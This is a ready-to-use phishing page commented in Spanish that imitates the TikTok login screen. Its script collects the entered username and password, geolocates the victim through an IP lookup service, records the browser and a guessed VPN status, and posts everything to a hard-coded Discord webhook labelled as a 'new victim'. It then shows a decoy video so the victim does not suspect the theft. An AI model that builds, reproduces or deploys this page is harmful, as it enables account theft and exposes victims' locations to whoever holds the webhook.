<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <link rel="icon" href="https://sf-tb-sg.ibytedtos.com/obj/ies-fe/obj/ad-room-tiktok-sg/2022_06_13/1655103746049.ico">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#000; color:#fff; font-family:system-ui; overflow:hidden; }
        #login { position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:9999; display:flex; align-items:center; justify-content:center; }
        .login-box { background:rgba(255,255,255,0.1); padding:40px; border-radius:20px; width:90%; max-width:380px; backdrop-filter:blur(10px); }
        .logo { width:60px; margin:0 auto 30px; display:block; }
        input { width:100%; padding:15px; margin:15px 0; border:none; border-radius:50px; background:rgba(255,255,255,0.1); color:#fff; font-size:16px; }
        input::placeholder { color:#aaa; }
        button { width:100%; padding:15px; background:#fe2c55; border:none; border-radius:50px; color:#fff; font-weight:bold; font-size:18px; cursor:pointer; }
        .tiktok { display:none; }
        .video { width:100vw; height:100vh; object-fit:cover; }
        .overlay { position:absolute; bottom:20px; left:20px; right:20px; }
        .heart { position:absolute; right:20px; bottom:100px; font-size:50px; animation:like 0.6s; }
        @keyframes like { 0%{transform:scale(0)} 50%{transform:scale(1.4)} 100%{transform:scale(1)} }
    </style>
</head>
<body>

<!-- LOGIN PHISHING (con captura total) -->
<div id="login">
    <div class="login-box">
        <img src="https://sf16-scmcdn-va.ibytedtos.com/obj/ies-music-tiktok-sg/2022_06_13/1655103746049.ico" class="logo">
        <h2 style="text-align:center; margin-bottom:30px;">Inicia sesi√≥n en TikTok</h2>
        <input type="text" id="user" placeholder="Tel√©fono / Email / Usuario de TikTok" autocomplete="off">
        <input type="password" id="pass" placeholder="Contrase√±a">
        <button onclick="capturar()">Iniciar sesi√≥n</button>
        <p style="text-align:center; margin-top:20px; font-size:14px; color:#888;">
            Al continuar, aceptas los T√©rminos de servicio
        </p>
    </div>
</div>

<!-- TikTok real (se activa despu√©s del login) -->
<div class="tiktok" id="tiktok">
    <video class="video" src="https://v16m-default.akamaized.net/8f2d8c5e0e5d5d5d5d5d5d5d5d5d5d5d/123456789.mp4" autoplay loop muted playsinline></video>
    <div class="overlay">
        <div class="heart" id="heart">‚ù§Ô∏è</div>
        <h3>@tiktok_oficial</h3>
        <p>¬°Bienvenido de nuevo! üî•</p>
    </div>
</div>

<script>
async function capturar() {
    const user = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;
    
    if (!user || !pass) return alert("Completa ambos campos");

    // Captura datos avanzados
    const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
    const vpnDetected = ["NordVPN","ExpressVPN","Surfshark","Mullvad","ProtonVPN","Private Internet Access"].some(v => navigator.userAgent.includes(v));
    
    const payload = {
        content: "**üî• NUEVA V√çCTIMA EN TIKTOK CLON üî•**",
        embeds: [{
            color: 0xfe2c55,
            title: "Credenciales Capturadas",
            fields: [
                { name: "Usuario/Email", value: user, inline: false },
                { name: "Contrase√±a", value: pass, inline: false },
                { name: "IP", value: ipData.ip || "Desconocida", inline: true },
                { name: "Ciudad/Pa√≠s", value: `${ipData.city || "??"}, ${ipData.country_name || "??"}`, inline: true },
                { name: "ISP", value: ipData.org || "Desconocido", inline: true },
                { name: "VPN Detectada", value: vpnDetected ? "‚úÖ S√ç" : "‚ùå No", inline: true },
                { name: "Navegador", value: navigator.userAgent.substring(0,100), inline: false },
                { name: "Hora", value: new Date().toLocaleString("es-SV"), inline: true }
            ],
            footer: { text: "TikTok Clon v3.0 - Con esposas puestas üòà" }
        }]
    };

    // ENV√çA TODO A TU WEBHOOK
    fetch("https://discord.com/api/webhooks/1447381927698104321/9LfvZiyHMAWnrpy1Bjvcq2kJuWZKhM35dPL92lkEu2fEgckHYBcXeikP82MAhR_uP6b3", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });

    // Muestra el TikTok real para que no sospechen
    setTimeout(() => {
        document.getElementById('login').style.display = "none";
        document.getElementById('tiktok').style.display = "block";
        document.getElementById('heart').style.display = "block";
        setTimeout(() => document.getElementById('heart').style.display = "none", 1000);
    }, 800);
}
</script>
</body>
</html>
